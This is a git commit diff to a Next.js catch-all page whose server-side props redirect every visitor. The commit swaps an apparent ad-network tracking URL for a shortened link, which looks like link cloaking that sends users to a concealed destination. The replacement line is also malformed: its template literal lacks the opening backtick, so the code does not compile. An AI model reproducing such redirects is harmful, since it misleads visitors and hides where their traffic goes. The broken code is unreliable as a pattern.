7d03a3ec2ab68545a6bd59e5cfe9e4bb808f1d81
funtv121 <149967727+funtv121@users.noreply.github.com>
2023-11-05 17:04:41 -0400

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://surprisinglystaunchdemocratic.com/xjpphhnepg?key=0e341ba021c458ee5375afec767360b0/`
+					https://shorturl.at/qGRWX/`
 				}`,
 			},
 		};
